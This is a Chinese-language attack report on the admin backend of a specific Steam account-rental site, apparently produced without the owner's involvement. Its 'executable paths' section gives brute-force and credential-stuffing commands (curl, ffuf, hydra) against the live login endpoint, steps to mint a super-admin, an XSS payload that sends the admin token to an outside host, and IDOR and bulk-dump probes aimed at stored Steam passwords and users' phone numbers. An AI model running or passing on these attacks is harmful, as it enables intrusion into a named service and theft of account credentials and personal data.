## 0. 一句话结论

一个 Steam 账号租赁（租号）业务的 ERP 管理后台：React SPA + Go(Gin) API。前端把整条路由表、163 个接口、26 个权限点和"隐藏"管理路径 `/pxxxasl-7x9k2m` 全部编进了一个 328KB 的 JS 里，未做任何混淆。认证只靠 `localStorage.admin_token` 一个 Bearer，登录口无验证码、未观察到限流。真正的边界在后端，前端所有权限判断都是装饰。

## 2. 认证链路（代码级）

### 2.1 统一请求器（`index-BXdINZ7J.js` @275624）

```js
const E = async (path, init) => {
  const base = {};                                       // FormData 时不设 Content-Type
  const init_headers = init && init.body instanceof FormData ? {} : {"Content-Type": "application/json"};
  const tok = localStorage.getItem("admin_token");
  const headers = new Headers(init_headers);
  if (tok) headers.set("Authorization", "Bearer " + tok);
  let res;
  try { res = await fetch(Oc + path, Object.assign({}, init, {headers})); }
  catch { throw new Error("网络异常，请稍后重试。"); }
  if (res.status === 401 && localStorage.getItem("admin_token")) {
    localStorage.removeItem("admin_token");
    window.location.href = "/pxxxasl-7x9k2m/login";
  }
  if (!res.ok) { const b = await res.json().catch(()=>null); throw new Error((b && b.error) || ("Error " + res.status)); }
  return res.status === 204 ? {} : res.json();
};
```

要点：
- Token 存 `localStorage`（非 HttpOnly Cookie）→ 任何同源 XSS 都能整条拖走并离线重放。
- 前端不解码 token、不检查 exp、无 refresh 机制；服务端 401 就直接踢回登录页。
- 双请求器 `E` / `qu`（后者用于读取响应头，CORS 允许 `X-Client-Source`、`X-User-ID` 两个自定义头）。

### 2.3 权限模型（纯前端）

```js
function isSuper(user = getAdminUser()) { return user?.role === "super_admin"; }
function hasPerm(key, user = getAdminUser()) {
  if (isSuper(user)) return true;
  return user?.permissions?.includes(key)
      || (key === "system.web_tutorials" && user?.permissions?.includes("system.faqs"))
      || (key === "open_platform.taobao_items" && user?.permissions?.includes("open_platform.taobao_orders"));
```

## 6. 弱点排序

**P0 — 无验证码 + 无限流（或无有效限流）**：登录是唯一入口，10 次连击无任何惩罚。撞库/字典爆破是最高性价比路径。

**P0 — 凭据库本身**：后台能取 Steam 账号明文密码 + 共享密钥，以及全站用户手机号/微信 OpenID。一旦进入即全量数据。

**P1 — Token 落 localStorage**：任意一处存储型 XSS（公告富文本、FAQ、网站教程、上传的 SVG）即等价管理员被接管；无 CSP 做第二道保险。

**P1 — 上传接口未见类型校验证据**：三个上传点若只校验扩展名/MIME，可打 SVG/HTML 落地 → 同源 XSS → 拖 token。

**P2 — 前端 RBAC 完全可伪造**：只影响 UI，但给低权账号提供完整接口地图，降低横向成本。

**P2 — "隐藏后台路径"写死在前端**：出现在 bundle 与 401 跳转分支里，F12 就能看见。

**P2 — nginx 版本泄露 + 路由逐条写死**：维护性差，任意新页面刷新即 404。

## 7. 可执行路径

### 路径 A：登录口爆破 / 撞库（无需任何前置）

```bash
API=https://api.zuhaome.com/api/v1

# 1) 先确认限流阈值
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST "$API/admin/auth/login" \
    -H "Content-Type: application/json" -H "Origin: https://admin.zuhaome.com" \
    -d "{\"username\":\"probe_$i\",\"password\":\"x\"}"
done

# 2) 密码字典爆破（ffuf，按响应体过滤）
ffuf -u $API/admin/auth/login -X POST \
  -H "Content-Type: application/json" -H "Origin: https://admin.zuhaome.com" \
  -d '{"username":"admin","password":"FUZZ"}' \
  -w WORDLIST -mc all -fr '用户名或密码错误' -t 5 -rate 5

# 3) 撞库（hydra）
hydra -L users.txt -P pass.txt api.zuhaome.com https-post-form \
  "/api/v1/admin/auth/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:F=用户名或密码错误"
```

成功后拿到 `{token, role, permissions}`，直接：

```bash
curl -s $API/admin/me -H "Authorization: Bearer $TOKEN"
```

### 路径 B：低权账号 → 高权

1. `localStorage.admin_user` 改 `super_admin` → 菜单全亮，抄下所有接口与参数。
2. 逐个打 26 个权限点对应接口，观察哪些返回 200 —— 后端若按路径前缀粗粒度鉴权，会出现"菜单无权但接口可调"。
3. 提权终点：`POST /admin/admins` 新建超管；或 `PUT /admin/admins/{id}` 改自己 role。

### 路径 C：XSS → token（有编辑权限时）

1. 在 公告管理 / FAQ / 网站教程 富文本插 `<img src=x onerror="fetch('//OAST/?t='+localStorage.admin_token)">`。
2. 或上传 `<svg onload=...>` 到 `/admin/faqs/upload-image`，再以图片形式引用。
3. 管理员打开页面即带走 token；存 localStorage + 无 CSP，成功率取决于服务端是否过滤 on* 属性与 SVG。
4. 拿到 token 用 curl 全量拉数据，不依赖浏览器。

### 路径 D：接口层（需 token，重点在越权）

- **IDOR**：`/admin/orders/{id}/credential`、`/admin/users/{id}`、`/admin/accounts/{id}/token` 遍历自增 ID。
- **方法越权**：只读角色尝试 `PUT/POST/DELETE`（前端不限制这些按钮的显隐，后端是否按 role 拦是未知项）。
- **分页放大**：列表普遍带 `page&size`（前端自己就写死 `/admin/categories?page=1&size=500`），试 `size=100000` 拖库。
- **破坏性接口**：`?older_than_days=1` 这类，测试时先用 `older_than_days=36500` 之类无命中值探路。
